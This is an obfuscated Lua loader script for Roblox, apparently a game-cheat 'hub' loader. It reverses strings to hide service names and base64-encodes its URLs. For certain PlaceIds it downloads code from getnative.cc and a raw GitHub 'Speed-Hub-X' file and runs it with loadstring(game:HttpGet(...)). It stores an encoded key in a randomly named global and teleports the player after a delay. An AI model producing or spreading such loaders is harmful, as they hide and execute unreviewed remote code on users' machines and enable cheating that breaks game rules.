local _0x1A = game:GetService(string.reverse("ecivreStropeleT"))
local _0x2B = game:GetService(string.reverse("sreyalP"))
local b64d = function(s)
	local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	s = s:gsub("[^"..b.."=]", "")
	return (s:gsub(".", function(x)
		if x == "=" then return "" end
		local r,f="",(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and "1" or "0") end
		return r
	end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
		if #x ~= 8 then return "" end
		local c = 0
		for i = 1, 8 do c = c + (x:sub(i,i) == "1" and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

local _0x3C = {
	[116495829188952] = function()
		_G["\95\95"..math.random()] = b64d("VHFEb2tqdVlZTVZJdVBPQm1ZWktaanBXQ3J0bkdSbWlV") -- decoded: TqDokjuYYMVIuPOBmYZKjpWCrtnGRmiU
		(loadstring or load)(game:HttpGet(b64d("aHR0cHM6Ly9nZXRuYXRpdmUuY2Mvc2NyaXB0L2xvYWRlcg==")))()
	end,

	[126884695634066] = function()
		local _url = b64d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FobWFkVjk5L1NwZWVkLUh1Yi1YL21haW4vU3BlZWQlMjBIdWIlMjBYLmx1YQ==")
		loadstring(game:HttpGet(_url, true))()
	end,

	[70876832253163] = function()
		_G["\95\95"..tick()] = b64d("VHFEb2tqdVlZTVZJdVBPQm1ZWktaanBXQ3J0bkdSbWlV")
		(loadstring or load)(game:HttpGet(b64d("aHR0cHM6Ly9nZXRuYXRpdmUuY2Mvc2NyaXB0L2xvYWRlcg==")))()

		task.delay(240, function()
			local _plr = _0x2B.LocalPlayer
			if _plr then
				_0x1A:Teleport(116495829188952, _plr)
			end
		end)
	end,
}

local _0xID = game.PlaceId
local _0xF = _0x3C[_0xID]
if _0xF then (_0xF)() end
